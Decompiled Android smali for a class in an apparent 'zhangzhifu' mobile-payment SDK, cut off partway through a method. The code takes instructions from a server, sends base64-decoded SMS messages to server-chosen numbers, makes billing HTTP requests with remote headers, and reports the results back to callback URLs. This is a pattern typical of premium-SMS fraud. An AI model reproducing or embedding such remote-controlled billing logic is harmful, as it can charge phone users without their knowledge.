.class public Lorg/zzf/core/c/a;
.super Ljava/lang/Object;


# instance fields
.field public a:Z

.field public b:Z

.field private c:Landroid/content/Context;

.field private d:Ljava/lang/String;

.field private e:Ljava/lang/String;

.field private f:Ljava/util/Map;

.field private g:Ljava/net/HttpURLConnection;

.field private h:Z

.field private i:Ljava/lang/String;

.field private j:Ljava/lang/String;

.field private k:Lorg/apache/http/HttpResponse;

.field private l:Lorg/zzf/core/d/b;

.field private m:Ljava/lang/String;

.field private n:Ljava/lang/String;

.field private o:Ljava/lang/String;

.field private p:Ljava/lang/String;

.field private q:Ljava/lang/String;

.field private r:Ljava/lang/String;

.field private s:Ljava/lang/String;

.field private t:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 2

    const/4 v1, 0x0

    const/4 v0, 0x0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object v0, p0, Lorg/zzf/core/c/a;->e:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->f:Ljava/util/Map;

    iput-object v0, p0, Lorg/zzf/core/c/a;->g:Ljava/net/HttpURLConnection;

    iput-boolean v1, p0, Lorg/zzf/core/c/a;->a:Z

    iput-boolean v1, p0, Lorg/zzf/core/c/a;->b:Z

    iput-boolean v1, p0, Lorg/zzf/core/c/a;->h:Z

    iput-object v0, p0, Lorg/zzf/core/c/a;->i:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->j:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->k:Lorg/apache/http/HttpResponse;

    iput-object v0, p0, Lorg/zzf/core/c/a;->m:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->n:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->o:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->p:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->q:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->r:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->s:Ljava/lang/String;

    iput-object v0, p0, Lorg/zzf/core/c/a;->t:Ljava/lang/String;

    iput-object p1, p0, Lorg/zzf/core/c/a;->c:Landroid/content/Context;

    return-void
.end method

.method private a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 13

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "&contentid="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v1, p0, Lorg/zzf/core/c/a;->r:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-static {p1, v1, v2}, Lorg/zzf/core/f/o;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)[Lorg/apache/http/Header;

    move-result-object v1

    invoke-static {v0, v1, p1}, Lorg/zzf/core/f/o;->a(Ljava/lang/String;[Lorg/apache/http/Header;Landroid/content/Context;)Lorg/apache/http/HttpResponse;

    move-result-object v0

    if-eqz v0, :cond_b

    invoke-static {v0, p1}, Lorg/zzf/core/f/o;->a(Lorg/apache/http/HttpResponse;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v0, "status"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "1"

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    const-string v0, "port"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v0, "contentsid"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v0, "repeat"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v0, "content"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_10

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, v0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const-string v0, "status"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v0, "linkid"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v0, "chnext"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v0, "apiver"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v0, "smspay"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v2

    const-string v0, "httppay"

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v5

    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_7

    const/4 v0, 0x0

    move v1, v0

    :goto_0
    invoke-virtual {v2}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-ge v1, v0, :cond_7

    invoke-virtual {v2, v1}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lorg/json/JSONObject;

    const-string v3, "sn"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v3, "delay"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v3, "desc"

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "sendtype"

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v6, "msg64"

    invoke-virtual {v0, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "port"

    invoke-virtual {v0, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v8

    const-string v9, "cburl"

    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_12

    const-string v8, "cburl"

    invoke-virtual {v0, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_0

    const-string v8, "smsCallback"

    invoke-virtual {v0, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_1

    :cond_0
    iput-object v0, p0, Lorg/zzf/core/c/a;->e:Ljava/lang/String;

    :cond_1
    :goto_1
    new-instance v8, Lorg/zzf/core/zdx/a;

    invoke-direct {v8}, Lorg/zzf/core/zdx/a;-><init>()V

    const/4 v9, 0x0

    invoke-static {p1, v9}, Lorg/zzf/core/b/i;->h(Landroid/content/Context;I)V

    invoke-static {v3}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_2

    const-string v9, "regsms"

    invoke-virtual {v3, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    :cond_2
    const-string v9, "data"

    invoke-virtual {v4, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_3

    invoke-static {}, Lorg/zzf/core/zdx/SendZdxReceiver;->a()Lorg/zzf/core/zdx/SendZdxReceiver;

    move-result-object v9

    new-instance v10, Landroid/content/IntentFilter;

    const-string v11, "android.zhangzhifu.ZDX_RECEIVER"

    invoke-direct {v10, v11}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, v9, v10}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    invoke-virtual {v6}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v9

    const/4 v10, 0x0

    invoke-static {v9, v10}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v9

    new-instance v10, Landroid/content/Intent;

    invoke-direct {v10}, Landroid/content/Intent;-><init>()V

    const-string v11, "mobile"

    invoke-virtual {v10, v11, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v11, "content"

    invoke-virtual {v10, v11, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[B)Landroid/content/Intent;

    const-string v9, "android.zhangzhifu.ZDX_RECEIVER_DATA"

    invoke-virtual {v10, v9}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p1, v10}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_3

    const-string v9, "registerCallback"

    invoke-virtual {v0, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_3

    invoke-direct {p0, p1, v0}, Lorg/zzf/core/c/a;->b(Landroid/content/Context;Ljava/lang/String;)V

    :cond_3
    const-string v9, "txt"

    invoke-virtual {v4, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    invoke-static {}, Lorg/zzf/core/zdx/SendZdxReceiver;->a()Lorg/zzf/core/zdx/SendZdxReceiver;

    move-result-object v9

    new-instance v10, Landroid/content/IntentFilter;

    const-string v11, "android.zhangzhifu.ZDX_RECEIVER"

    invoke-direct {v10, v11}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p1, v9, v10}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    new-instance v9, Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v10

    const/4 v11, 0x0

    invoke-static {v10, v11}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/String;-><init>([B)V

    new-instance v10, Landroid/content/Intent;

    invoke-direct {v10}, Landroid/content/Intent;-><init>()V

    const-string v11, "mobile"

    invoke-virtual {v10, v11, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v11, "content"

    invoke-virtual {v10, v11, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v9, "android.zhangzhifu.ZDX_RECEIVER"

    invoke-virtual {v10, v9}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p1, v10}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v9

    if-nez v9, :cond_4

    const-string v9, "registerCallback"

    invoke-virtual {v0, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_4

    invoke-direct {p0, p1, v0}, Lorg/zzf/core/c/a;->b(Landroid/content/Context;Ljava/lang/String;)V

    :cond_4
    invoke-static {v3}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "paysms"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    const-string v0, "txt"

    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    new-instance v0, Ljava/lang/String;

    invoke-virtual {v6}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v9, 0x0

    invoke-static {v3, v9}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v3

    invoke-direct {v0, v3}, Ljava/lang/String;-><init>([B)V

    invoke-virtual {v7}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v9, 0x0

    invoke-virtual {v8, p1, v3, v0, v9}, Lorg/zzf/core/zdx/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;[B)Z

    const/4 v0, 0x1

    invoke-static {p1, v0}, Lorg/zzf/core/b/i;->h(Landroid/content/Context;I)V

    iget-object v0, p0, Lorg/zzf/core/c/a;->e:Ljava/lang/String;

    invoke-direct {p0, p1, v0}, Lorg/zzf/core/c/a;->c(Landroid/content/Context;Ljava/lang/String;)V

    :cond_5
    const-string v0, "data"

    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-virtual {v6}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x0

    invoke-static {v0, v3}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v0

    invoke-virtual {v7}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v8, p1, v3, v4, v0}, Lorg/zzf/core/zdx/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;[B)Z

    const/4 v0, 0x1

    invoke-static {p1, v0}, Lorg/zzf/core/b/i;->h(Landroid/content/Context;I)V

    iget-object v0, p0, Lorg/zzf/core/c/a;->e:Ljava/lang/String;

    invoke-direct {p0, p1, v0}, Lorg/zzf/core/c/a;->c(Landroid/content/Context;Ljava/lang/String;)V

    :cond_6
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto/16 :goto_0

    :cond_7
    invoke-virtual {v5}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_b

    const/4 v0, 0x0

    move v4, v0

    :goto_2
    invoke-virtual {v5}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-ge v4, v0, :cond_b

    invoke-virtual {v5, v4}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lorg/json/JSONObject;

    const-string v1, "sn"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v1, "delay"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v1, "desc"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v1, "url"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v1, "method"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    const-string v1, "cburl"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v1, "msg64"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_11

    new-instance v1, Ljava/lang/String;

    const-string v2, "msg64"

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v2, v3}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/String;-><init>([B)V

    move-object v3, v1

    :goto_3
    const-string v1, "telhttp"

    invoke-virtual {v6, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_9

    const-string v1, "headers"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v9

    new-instance v10, Ljava/util/HashMap;

    invoke-direct {v10}, Ljava/util/HashMap;-><init>()V

    invoke-virtual {v9}, Lorg/json/JSONArray;->length()I

    move-result v1

    if-lez v1, :cond_8

    const/4 v1, 0x0

    move v2, v1

    :goto_4
    invoke-virtual {v9}, Lorg/json/JSONArray;->length()I

    move-result v1

    if-ge v2, v1, :cond_8

    invoke-virtual {v9, v2}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lorg/json/JSONObject;

    const-string v11, "hdn"

    invoke-virtual {v1, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const-string v12, "hdv"

    invoke-virtual {v1, v12}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v10, v11, v1}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    add-int/lit8 v1, v2, 0x1

    move v2, v1

    goto :goto_4

    :cond_8
    invoke-static {v7, v10}, Lorg/zzf/core/f/d;->a(Ljava/lang/String;Ljava/util/Map;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_a

    new-instance v2, Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    const/4 v9, 0x0

    invoke-static {v1, v9}, Landroid/util/Base64;->encode([BI)[B

    move-result-object v1

    invoke-direct {v2, v1}, Ljava/lang/String;-><init>([B)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v9, "&rspCnt="

    invoke-virtual {v1, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v9, "\n"

    const-string v11, ""

    invoke-virtual {v2, v9, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    const-string v9, "\r"

    const-string v11, ""

    invoke-virtual {v2, v9, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v10}, Lorg/zzf/core/f/d;->a(Ljava/lang/String;Ljava/util/Map;)Ljava/lang/String;

    const/4 v1, 0x0

    invoke-static {v1}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    :cond_9
    :goto_5
    const-string v1, "payhttp"

    invoke-virtual {v6, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_d

    new-instance v2, Ljava/util/HashMap;

    invoke-direct {v2}, Ljava/util/HashMap;-><init>()V

    const-string v1, "headers"

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v6

    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_c

    const/4 v0, 0x0

    move v1, v0

    :goto_6
    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-ge v1, v0, :cond_c

    invoke-virtual {v6, v1}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lorg/json/JSONObject;

    const-string v9, "hdn"

    invoke-virtual {v0, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    const-string v10, "hdv"

    invoke-virtual {v0, v10}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v2, v9, v0}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto :goto_6

    :cond_a
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "&rspCnt="

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v10}, Lorg/zzf/core/f/d;->a(Ljava/lang/String;Ljava/util/Map;)Ljava/lang/String;

    goto :goto_5

    :catch_0
    move-exception v0

    :cond_b
    :goto_7
    const/4 v0, 0x0

    return-object v0

    :cond_c
    invoke-static {v7, v3, v2}, Lorg/zzf/core/f/d;->a(Ljava/lang/String;Ljava/lang/String;Ljava/util/Map;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_f

    const-string v1, "200000"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_e

    invoke-static {}, Lorg/zzf/core/b/i;->a()Lorg/zzf/core/b/i;

    move-result-object v1

    const/16 v3, 0x3e9

    invoke-virtual {v1, p1, v3}, Lorg/zzf/core/b/i;->e(Landroid/content/Context;I)V

    :goto_8
    new-instance v1, Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    const/4 v3, 0x0

    invoke-static {v0, v3}, Landroid/util/Base64;->encode([BI)[B

    move-result-object v0

    invoke-direct {v1, v0}, Ljava/lang/String;-><init>([B)V

    const-string v0, "\n"

    const-string v3, ""

    invoke-virtual {v1, v0, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "\r"

    const-string v3, ""

    invoke-virtual {v0, v1, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, "&rspCnt="

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1, v2}, Lorg/zzf/core/f/d;->a(Ljava/lang/String;Ljava/lang/String;Ljava/util/Map;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "zhangPay_log"

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "feeLast_result\u503c:"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_d
    :goto_9
    add-int/lit8 v0, v4, 0x1

    move v4, v0

    goto/16 :goto_2

    :cond_e
    invoke-static {}, Lorg/zzf/core/b/i;->a()Lorg/zzf/core/b/i;

    move-result-object v1

    const/16 v3, 0x3f3

    invoke-virtual {v1, p1, v3}, Lorg/zzf/core/b/i;->e(Landroid/content/Context;I)V

    goto :goto_8

    :cond_f
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "&rspCnt="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1, v2}, Lorg/zzf/core/f/d;->a(Ljava/lang/String;Ljava/lang/String;Ljava/util/Map;)Ljava/lang/String;

    goto :goto_9

    :cond_10
    invoke-static {}, Lorg/zzf/core/b/i;->a()Lorg/zzf/core/b/i;

    move-result-object v0

    const/16 v1, 0x3f3

    invoke-virtual {v0, p1, v1}, Lorg/zzf/core/b/i;->e(Landroid/content/Context;I)V

    invoke-static {}, Lorg/zzf/core/a;->a()Lorg/zzf/core/a;

    move-result-object v0

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Lorg/zzf/core/a;->a(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_7

    :cond_11
    const/4 v1, 0x0

    move-object v3, v1

    goto/16 :goto_3

    :cond_12
    const/4 v0, 0x0

    goto/16 :goto_1
.end method

.method static synthetic a(Lorg/zzf/core/c/a;)Lorg/apache/http/HttpResponse;
    .locals 1

    iget-object v0, p0, Lorg/zzf/core/c/a;->k:Lorg/apache/http/HttpResponse;

    return-object v0
.end method

.method static synthetic a(Lorg/zzf/core/c/a;Lorg/apache/http/HttpResponse;)Lorg/apache/http/HttpResponse;
    .locals 0

    iput-object p1, p0, Lorg/zzf/core/c/a;->k:Lorg/apache/http/HttpResponse;

    return-object p1
.end method

.method private a(Lorg/zzf/core/d/f;)V
    .locals 2

    if-nez p1, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    invoke-virtual {p1}, Lorg/zzf/core/d/f;->a()Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-virtual {p1}, Lorg/zzf/core/d/f;->a()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0, p1}, Lorg/zzf/core/c/a;->b(Lorg/zzf/core/d/f;)V

    invoke-static {}, Lorg/zzf/core/b/b;->a()Lorg/zzf/core/b/b;

    move-result-object v0

    iget-object v1, p0, Lorg/zzf/core/c/a;->c:Landroid/content/Context;

    invoke-virtual {v0, v1, p1}, Lorg/zzf/core/b/b;->a(Landroid/content/Context;Lorg/zzf/core/d/f;)V

    goto :goto_0
.end method

.method private b(Landroid/content/Context;Ljava/lang/String;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lorg/zzf/core/c/b;

    invoke-direct {v1, p0, p2, p1}, Lorg/zzf/core/c/b;-><init>(Lorg/zzf/core/c/a;Ljava/lang/String;Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private b(Lorg/zzf/core/d/f;)V
    .locals 4

    :try_start_0
    invoke-virtual {p1}, Lorg/zzf/core/d/f;->a()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-eqz v2, :cond_1

    const/4 v0, 0x0

    move v1, v0

    :goto_0
    if-ge v1, v2, :cond_1

    invoke-virtual {p1}, Lorg/zzf/core/d/f;->a()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lorg/zzf/core/d/b;

